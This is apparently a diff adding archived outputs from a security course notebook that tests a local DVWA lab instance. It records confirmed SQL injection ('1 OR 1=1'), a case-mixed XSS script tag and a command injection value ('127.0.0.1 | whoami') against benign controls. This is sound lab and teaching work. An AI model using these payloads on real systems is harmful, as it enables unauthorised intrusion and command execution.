@@ -1,0 +1,48 @@
+Archived outputs from Santiago original notebook execution.
+Not outputs of the revised notebook.
+
+CELL 2
+Authorized local target: http://127.0.0.1:60281
+
+CELL 3
+Logged in; DVWA Security Level = Medium
+
+CELL 4
+
+CELL 5
+All three benign controls stayed negative.
+
+CELL 6
+
+CELL 7
+  [  1] CONFIRMED  3/3    sqli             '1 OR 1=1'
+  [  2] no effect  0/3    benign           '1'
+
+SQLI
+                                             Payload Family Intent  Confirmed  \
+0  Payload(text='1 OR 1=1', intent='numeric tauto...                     True
+1  Payload(text='1', intent='ordinary ID lookup',...                    False
+
+   Deterministic Note
+0           True
+1           True         [  1] CONFIRMED  3/3    xss              '<ScRiPt>window.__HW2_XSS__=1</ScRiPt>'
+  [  2] no effect  0/3    benign           'Ada'
+
+XSS
+                                             Payload Family Intent  Confirmed  \
+0  Payload(text='<ScRiPt>window.__HW2_XSS__=1</Sc...                     True
+1  Payload(text='Ada', intent='ordinary display n...                    False
+
+   Deterministic Note
+0           True
+1           True         [  1] CONFIRMED  3/3    cmdi             '127.0.0.1 | whoami'
+  [  2] no effect  0/3    benign           '127.0.0.1'
+
+CMDI
+                                             Payload Family Intent  Confirmed  \
+0  Payload(text='127.0.0.1 | whoami', intent='pip...                     True
+1  Payload(text='127.0.0.1', intent='ordinary loo...                    False
+
+   Deterministic Note
+0           True
+1           True       Part A complete.
